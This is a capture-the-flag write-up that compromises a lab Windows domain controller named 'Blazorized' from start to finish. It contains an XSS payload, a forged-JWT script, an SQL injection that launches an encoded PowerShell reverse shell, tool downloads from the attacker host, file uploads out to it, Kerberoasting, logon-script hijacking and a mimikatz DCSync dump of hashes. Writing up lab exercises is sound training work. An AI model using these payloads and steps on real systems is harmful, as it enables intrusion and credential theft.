## NMAP
```r
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.129.188.70
```

```r
❯ nmap -p53,80,88,135,139,445,464,593,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49672,49678,49776,49782 -sCV -oN targeted 10.129.188.70
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 17:46 EDT
Nmap scan report for 10.129.188.70
Host is up (0.62s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://blazorized.htb
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-30 21:46:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ms-sql-info: 
|   10.129.188.70\BLAZORIZED: 
|     Instance name: BLAZORIZED
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|     TCP port: 1433
|_    Clustered: false
|_ssl-date: 2024-06-30T21:48:08+00:00; +5s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.188.70\BLAZORIZED: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-06-30T20:39:05
|_Not valid after:  2054-06-30T20:39:05
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49776/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ms-sql-info: 
|   10.129.188.70:49776: 
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|_    TCP port: 49776
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-06-30T20:39:05
|_Not valid after:  2054-06-30T20:39:05
|_ssl-date: 2024-06-30T21:48:08+00:00; +5s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.188.70:49776: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
49782/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-06-30T21:48:00
|_  start_date: N/A
|_clock-skew: mean: 4s, deviation: 0s, median: 4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.76 seconds
```

---

# Add domain to /etc/hosts
```r
echo "10.129.188.70 blazorized.htb " | sudo tee -a /etc/hosts
```

![[Pasted image 20240630181310.png]]

# Exploring blazorized.htb
When searching for possible subdomains and useful information I find that clicking on **Check for Updates** calls a certain API.
![[Pasted image 20240630182108.png]]

```r
 http://api.blazorized.htb/
```

So we add this new subdomain to the /etc/hosts.

```r
echo "10.129.188.70 api.blazorized.htb " | sudo tee -a /etc/hosts
```

## XSS founded on blazoridez.htb
Another thing I found is a XSS on the **Markdown Playground**. (https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/xss-in-markdown)
![[Pasted image 20240630182458.png]]

The payload was:
```javascript
`<p x="`<img src=x onerror=alert(1)>"></p>
```
But I unable to grab cookies or something interesting.

---
So I continue with subdomain enumeration, for this time Ill use WFUZZ:
```r
wfuzz -c -w /usr/share/seclists/Discovery/DNS/namelist.txt --hc 400,404,403 -H "Host: FUZZ.blazorized.htb" -u http://blazorized.htb -t 100 --hh 144
```
![[Pasted image 20240630182805.png]]

I find out the admin panel, so I continue adding this subdomain to the /etc/hosts as habitual.

```r
echo "10.129.188.70 admin.blazorized.htb " | sudo tee -a /etc/hosts
```

![[Pasted image 20240630183254.png]]

---
## Interesting DLL files from Blazor framework

One interesting thing of this website was the buch of DLL files, after a while trying sttufs I decided to download some DLLs to try reverse engineering. I really try with a lot of DLL files but how this is a writeup Ill show only the one who we need (for luck of us).

![[Pasted image 20240630183807.png]]

I download **Blazorized.Helpers.dll** from (http://blazorized.htb/_framework/Blazorized.Helpers.dll), and I open this DLL with the tool **dnSpy**.

![[Pasted image 20240630184524.png]]

I found interesting things about to generate a JWT  Credential for Administrator, here is the content:
```r
using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Runtime.CompilerServices;
using System.Security.Claims;
using System.Text;
using Microsoft.IdentityModel.Tokens;

namespace Blazorized.Helpers
{
    // Token: 0x02000007 RID: 7
    [NullableContext(1)]
    [Nullable(0)]
    public static class JWT
    {
        // Token: 0x06000008 RID: 8 RVA: 0x00002164 File Offset: 0x00000364
        private static SigningCredentials GetSigningCredentials()
        {
            SigningCredentials result;
            try
            {
                result = new SigningCredentials(new SymmetricSecurityKey(Encoding.UTF8.GetBytes(JWT.jwtSymmetricSecurityKey)), "HS512");
            }
            catch (Exception)
            {
                throw;
            }
            return result;
        }

        // Token: 0x06000009 RID: 9 RVA: 0x000021A8 File Offset: 0x000003A8
        public static string GenerateTemporaryJWT(long expirationDurationInSeconds = 60L)
        {
            string result;
            try
            {
                List<Claim> list = new List<Claim>
                {
                    new Claim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress", JWT.superAdminEmailClaimValue),
                    new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", JWT.postsPermissionsClaimValue),
                    new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", JWT.categoriesPermissionsClaimValue)
                };
                string text = JWT.issuer;
                string text2 = JWT.apiAudience;
                IEnumerable<Claim> enumerable = list;
                SigningCredentials signingCredentials = JWT.GetSigningCredentials();
                DateTime? dateTime = new DateTime?(DateTime.UtcNow.AddSeconds((double)expirationDurationInSeconds));
                JwtSecurityToken jwtSecurityToken = new JwtSecurityToken(text, text2, enumerable, null, dateTime, signingCredentials);
                result = new JwtSecurityTokenHandler().WriteToken(jwtSecurityToken);
            }
            catch (Exception)
            {
                throw;
            }
            return result;
        }

        // Token: 0x0600000A RID: 10 RVA: 0x00002258 File Offset: 0x00000458
        public static string GenerateSuperAdminJWT(long expirationDurationInSeconds = 60L)
        {
            string result;
            try
            {
                List<Claim> list = new List<Claim>
                {
                    new Claim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress", JWT.superAdminEmailClaimValue),
                    new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", JWT.superAdminRoleClaimValue)
                };
                string text = JWT.issuer;
                string text2 = JWT.adminDashboardAudience;
                IEnumerable<Claim> enumerable = list;
                SigningCredentials signingCredentials = JWT.GetSigningCredentials();
                DateTime? dateTime = new DateTime?(DateTime.UtcNow.AddSeconds((double)expirationDurationInSeconds));
                JwtSecurityToken jwtSecurityToken = new JwtSecurityToken(text, text2, enumerable, null, dateTime, signingCredentials);
                result = new JwtSecurityTokenHandler().WriteToken(jwtSecurityToken);
            }
            catch (Exception)
            {
                throw;
            }
            return result;
        }

        // Token: 0x0600000B RID: 11 RVA: 0x000022F4 File Offset: 0x000004F4
        public static bool VerifyJWT(string jwt)
        {
            bool result = false;
            try
            {
                TokenValidationParameters tokenValidationParameters = new TokenValidationParameters
                {
                    ValidateIssuerSigningKey = true,
                    IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(JWT.jwtSymmetricSecurityKey)),
                    ValidateIssuer = true,
                    ValidIssuer = JWT.issuer,
                    ValidateAudience = true,
                    ValidAudiences = new string[]
                    {
                        JWT.apiAudience,
                        JWT.adminDashboardAudience
                    },
                    ValidateLifetime = true,
                    ClockSkew = TimeSpan.FromSeconds(10.0),
                    ValidAlgorithms = new string[]
                    {
                        "HS512"
                    }
                };
                try
                {
                    SecurityToken securityToken;
                    new JwtSecurityTokenHandler().ValidateToken(jwt, tokenValidationParameters, ref securityToken);
                    result = true;
                }
                catch (Exception)
                {
                }
            }
            catch (Exception)
            {
            }
            return result;
        }

        // Token: 0x04000005 RID: 5
        private const long EXPIRATION_DURATION_IN_SECONDS = 60L;

        // Token: 0x04000006 RID: 6
        private static readonly string jwtSymmetricSecurityKey = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a";

        // Token: 0x04000007 RID: 7
        private static readonly string superAdminEmailClaimValue = "superadmin@blazorized.htb";

        // Token: 0x04000008 RID: 8
        private static readonly string postsPermissionsClaimValue = "Posts_Get_All";

        // Token: 0x04000009 RID: 9
        private static readonly string categoriesPermissionsClaimValue = "Categories_Get_All";

        // Token: 0x0400000A RID: 10
        private static readonly string superAdminRoleClaimValue = "Super_Admin";

        // Token: 0x0400000B RID: 11
        private static readonly string issuer = "http://api.blazorized.htb";

        // Token: 0x0400000C RID: 12
        private static readonly string apiAudience = "http://api.blazorized.htb";

        // Token: 0x0400000D RID: 13
        private static readonly string adminDashboardAudience = "http://admin.blazorized.htb";
    }
}
```

With all this juicy information we can create our own token to access like Administrator on blazorized. You can use jwt.io, or in mi case I maded a script on python:

```python
import jwt
import datetime
import pytz

# Created by 3ky, enjoy :)
jwtSymmetricSecurityKey = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a"
issuer = "http://api.blazorized.htb"
apiAudience = "http://api.blazorized.htb"
adminDashboardAudience = "http://admin.blazorized.htb"
superAdminEmailClaimValue = "superadmin@blazorized.htb"
superAdminRoleClaimValue = "Super_Admin"

def get_signing_credentials() -> str:
    try:
        return jwtSymmetricSecurityKey
    except Exception as e:
        raise e

def generate_super_admin_jwt(expiration_duration_in_seconds: int = 60) -> str:
    try:
        claims = {
            "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": superAdminEmailClaimValue,
            "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": superAdminRoleClaimValue,
            "iss": issuer,
            "aud": adminDashboardAudience,
            "exp": datetime.datetime.now(pytz.utc) + datetime.timedelta(seconds=expiration_duration_in_seconds)
        }
        key = get_signing_credentials()
        jwt_token = jwt.encode(claims, key, algorithm="HS512")
        return jwt_token
    except Exception as e:
        raise e

if __name__ == "__main__":
    token = generate_super_admin_jwt()
    print(token)

```

**NOTE** Dont forget to install modules to work it ;).

---
# Generating JWT token with script and get Admin dashboard.

Okay, this token works with time, so I need to execute it, copy the token and put it on **Local Storage** like **jwt:value**.

## Generate it first
![[Pasted image 20240630185438.png]]
## Create value in Local Storage with the name of jwt:value
![[Captura de pantalla 2024-06-30 185508.png]]

So the last step is reload the website :).

![[Pasted image 20240630185704.png]]

---
## SQLi in Check Duplicatle Post Titles

![[Pasted image 20240630190226.png]]

Okay, we can found interesting XSS and SQLi in the admin dashboard, and we know this is an AD target so of course they are using MSSQLSERVER, this means we can try to **exec xp_cmdshell** and get our first shell.

Payload used (you can generate our in revshells):
```r
3'; use master; exec xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAiACw <SNIP>';-- -
```

![[Pasted image 20240630191352.png]]

![[Pasted image 20240630191755.png]]

**NOTE** Of course we need to have the nc listening.

---
# Run SharpHound.exe as NU_1055 for figuring out AD.

Okay we are NU_1055, and the first things we can do is run winPEAS.exe or SharpHound.exe to learn about our target. 

```r
curl 10.10.14.2:80/SharpHound.exe -o SharpHound.exe
.\SharpHound.exe -c all
```
![[Pasted image 20240630193114.png]]
## Then for file-transfer the zip from our Windows to Linux I used PSUpload.ps1

```r
curl 10.10.14.2:80/PSUpload.ps1 -o PSUpload.ps1
Import-Module .\PSUpload.ps1
Invoke-FileUpload -Uri http://10.10.14.2:8000/upload -File "20240630183054_BloodHound.zip"
```

**NOTE** We need uploadserver python server for works PSUpload.ps1
```r
python3 -m uploadserver
```

**NOTE** This machine can have errors, if you have an error trying to use SharpHound, for example the LDAP error, you must change server, or restart :(.

---
# Running Bloodhound to see blood 🧛

First we need to know what users are **High value**, in this case we have:
- RSA_4810
- SSA_6010
- Administrator (of course)

With a little of researching I found this:
![[Pasted image 20240630193837.png]]

"The user NU_1055@BLAZORIZED.HTB has the ability to write to the "serviceprincipalname" attribute to the user RSA_4810@BLAZORIZED.HTB".

---
# SPN Attack with PowerView for RSA_4810

```r
curl 10.10.14.2:80/PowerView.ps1 -o PowerView.ps1
Import-Module .\PowerView.ps1
#Check if RSA_4810 has not SPN
Get-DomainUser 'RSA_4810' | Select serviceprincipalname
#Set SPN
setspn -A http/RSA_4810 BLAZORIZED\RSA_4810
$User = Get-DomainUser 'RSA_4810'
$User | Get-DomainSPNTicket | fl
```

# So we are able to get the NTLM hash, so we proceed to crack it with John

```r
SamAccountName       : RSA_4810
DistinguishedName    : CN=RSA_4810,CN=Users,DC=blazorized,DC=htb
ServicePrincipalName : http/RSA_4810
TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*RSA_4810$blazorized.htb$http/RSA_4810*$9308113F562E050A2B8B29164F74142E$BB9E9FF0CD0               05834777D61AF4E50CEAEBA4E44A39E489EBE8F7EFC7042F461407F35C304323314170543B05C9221399F7EDA312264F                AFB9FC23B9CDD759FAAC5998A75E90292C14FE293567068C26D869380C0A0E9D079CAE1B7011E5004712555AB346942A                 BEBD0791C50308115230536B239FC590CEF878F88849E212FD939865554FB1C3FC26567E37FE66696EB11F13D3C77988                  BD5751755361CE00824469E732FECAB6F947F1C75031B0ABB1529043563EA1188B5A4F44942F99B105E71B64FEF16ACD                  CD93445625781B61E16BEA24C7190B8F5C46DEC642DF4FB3A750F6C3A9441C3410E443024C544F5E4176B062BD5DDCD7                  4281B17E61B79DCFE21F516088F3D0EBABC5D3B0B021A93A7BDB8C1977905C337F875F33FA08E6DF842CF89503B82BD9                   
<SNIP>
```

# Cracking hash with John

```r
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
#Password is (Ni7856Do9854Ki05Ng0005 #)
```

---
# Accesing as RSA_4810

```r
evil-winrm -u RSA_4810 -p '(Ni7856Do9854Ki05Ng0005 #)' -i 10.129.81.18
```

![[Pasted image 20240630200700.png]]

---
# Get a clue for obtain access to SSA_6010

Okay so our last objective is get access to SSA_6010, so we need to do some AD enumeration, for this I'll use **PowerView.ps1** again.

```r
curl 10.10.14.2:80/PowerView.ps1 -o PowerView.ps1
Import-Module .\PowerView.ps1
Get-DomainObject -Identity SSA_6010
```

```r
logoncount            : 4237
badpasswordtime       : 6/19/2024 9:58:18 AM
distinguishedname     : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : SSA_6010
lastlogontimestamp    : 6/27/2024 7:18:21 AM
userprincipalname     : SSA_6010@blazorized.htb
name                  : SSA_6010
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1124
samaccountname        : SSA_6010
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 6/27/2024 12:18:21 PM
instancetype          : 4
usncreated            : 29007
objectguid            : 8bf3166b-e716-4f91-946c-174e1fb433ed
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {6/19/2024 1:24:50 PM, 6/14/2024 12:40:41 PM, 6/14/2024 12:40:28 PM, 6/14/2024 12:38:20 PM...}
memberof              : {CN=Super_Support_Administrators,CN=Users,DC=blazorized,DC=htb, CN=Remote Management Users,CN=Builtin,DC=blazorized,DC=htb}
lastlogon             : 6/30/2024 7:10:16 PM
cn                    : SSA_6010
badpwdcount           : 0
scriptpath            : \\dc1\NETLOGON\A2BFDCF13BB2\B00AC3C11C0E\BAEDDDCD2BCB\C0B3ACE33AEF\2C0A3DFE2030
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/10/2024 2:32:00 PM
primarygroupid        : 513
pwdlastset            : 2/25/2024 11:56:55 AM
usnchanged            : 290904
```

The interesting thing is the **scriptpath**, and we need to figure out how to read that file, of course we can can check with **nxc** if our credential are able to be used for access to SMB shares.

```r
nxc smb 10.129.81.18 --shares -u RSA_4810 -p '(Ni7856Do9854Ki05Ng0005 #)'
```

After that, we can mount the smb, or we can use smbclient to get to the scriptpath and read the file.

```r
smbclient //10.129.81.18/SYSVOL -U "RSA_4810%(Ni7856Do9854Ki05Ng0005 #)"
```

![[Pasted image 20240630201413.png]]

Okay so this is a **bat** file, and if we read the file content is:

![[Pasted image 20240630201520.png]]

So after a lot of researching and reading Microsoft documentation we are able to change the **ScriptPath** with

```r
Set-DomainObject -Identity SSA_6010 -Set @{ScriptPath='C:\Windows\tasks\script.bat'}
```

But this dont going to work because of this info:

**Local logon scripts must be stored in a shared folder that uses the share name of Netlogon, or be stored in subfolders of the Netlogon folder.**
Extracted from: https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/assign-logon-script-profile-local-user

So  we need fo figure out how to use the same bat file, but there is a problem, we dont have enough permissions!.

---
## Create malicious.bat (typical powershell #3 Base64 payload)
```r
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

```r
cd C:\programdata\
curl 10.10.14.2:80/malicious.bat -o script.bat
```

```r
$inputFile = "C:\programdata\malicious.bat"
$outputFile = "C:\Windows\SYSVOL\sysvol\blazorized.htb\SCRIPTS\A32FF3AEAA23\AADE1BA2A3E3\E2B11C13F2BB\EC3110AA1C2B\232FB0FAEFCC.bat"

$content = Get-Content -Path $inputFile -Raw -Encoding UTF8
Set-Content -Path $outputFile -Value $content -Encoding ASCII

python3 bloodyAD.py -d blazorized.htb -u RSA_4810  -p '(Ni7856Do9854Ki05Ng0005 #)' --host dc1.blazorized.htb set object SSA_6010 scriptPath -v 'A32FF3AEAA23\AADE1BA2A3E3\E2B11C13F2BB\EC3110AA1C2B\232FB0FAEFCC.bat'
```

**NOTE** First I can do this without the python script, but IDK why not works more. So I used bloodyAD for works, remember to add dc1.blazorized.htb to /etc/hosts. https://github.com/CravateRouge/bloodyAD

![[Pasted image 20240701004840.png]]

----
# DSync from SSA_6010 to get Administrator hashes with Mimikatz.exe

![[Pasted image 20240701005452.png]]

# Upload mimikatz and make dsync
```r
curl 10.10.14.54:80/mimikatz.exe -o mimikatz.exe
.\mimikatz.exe lsadump::dcsync /domain:blazorized.htb /user:Administrator > output.txt
```

```
mimikatz # lsadump::dcsync /domain:blazorized.htb /user:Administrator                                                                                                                                                                 [DC] 'blazorized.htb' will be the domain                                                                             
[DC] 'DC1.blazorized.htb' will be the DC server                                                                      
[DC] 'Administrator' will be the user account                                                                                                                                                                                             
Object RDN           : Administrator                                                                                 
** SAM ACCOUNT **                                                                                                                                                                                                               
SAM Username         : Administrator                                                                                 
Account Type         : 30000000 ( USER_OBJECT )                                                                      
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )                                                
Account expiration   :                                                                                               
Password last change : 2/25/2024 12:54:43 PM                                                                         
Object Security ID   : S-1-5-21-2039403211-964143010-2924010611-500                                                  
Object Relative ID   : 500                                                                                           

Credentials:                                                                                                         
  Hash NTLM: f55ed1465179ba374ec1cad05b34a5f3                                                                        
    ntlm- 0: f55ed1465179ba374ec1cad05b34a5f3                                                                        
    ntlm- 1: eecc741ecf81836dcd6128f5c93313f2                                                                        
    ntlm- 2: c543bf260df887c25dd5fbacff7dcfb3                                                                        
    ntlm- 3: c6e7b0a59bf74718bce79c23708a24ff                                                                        
    ntlm- 4: fe57c7727f7c2549dd886159dff0d88a                                                                        
    ntlm- 5: b471c416c10615448c82a2cbb731efcb                                                                        
    ntlm- 6: b471c416c10615448c82a2cbb731efcb                                                                        
    ntlm- 7: aec132eaeee536a173e40572e8aad961                                                                        
    ntlm- 8: f83afb01d9b44ab9842d9c70d8d2440a                                                                        
    ntlm- 9: bdaffbfe64f1fc646a3353be1c2c3c99                                                                        
    lm  - 0: ad37753b9f78b6b98ec3bb65e5995c73                                                                        
    lm  - 1: c449777ea9b0cd7e6b96dd8c780c98f0                                                                        
    lm  - 2: ebbe34c80ab8762fa51e04bc1cd0e426
    lm  - 3: 471ac07583666ccff8700529021e4c9f                                                                        
    lm  - 4: ab4d5d93532cf6ad37a3f0247db1162f                                                                        
    lm  - 5: ece3bdafb6211176312c1db3d723ede8                                                                        
    lm  - 6: 1ccc6a1cd3c3e26da901a8946e79a3a5                                                                        
    lm  - 7: 8b3c1950099a9d59693858c00f43edaf                                                                        
    lm  - 8: a14ac624559928405ef99077ecb497ba                                                                                                                                                                                             
Supplemental Credentials:                                                                                                                                                  
* Primary:NTLM-Strong-NTOWF *                                                                                          Random Value : 36ff197ab8f852956e4dcbbe85e38e17
```
---
# Access as Administrator and get root flag.

```r
evil-winrm -i 10.10.11.22 -u administrator -H f55ed1465179ba374ec1cad05b34a5f3
```

![[Pasted image 20240701014356.png]]
